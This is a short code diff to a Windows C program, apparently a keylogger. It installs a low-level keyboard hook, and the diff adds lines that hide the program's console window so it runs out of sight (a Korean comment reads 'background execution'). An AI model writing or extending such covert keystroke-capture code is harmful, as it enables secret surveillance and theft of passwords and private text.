@@ -242,6 +242,10 @@ void CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
 
 int main(int argc, char* argv[])
 {
+    
+    HWND hWnd = GetForegroundWindow();
+    ShowWindow(hWnd, SW_HIDE); // 백그라운드 실행
+
     HMODULE hInstance = GetModuleHandle(NULL);    //자신의 module값을 가져온다.
 
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);    //후킹 프로시저를 설치
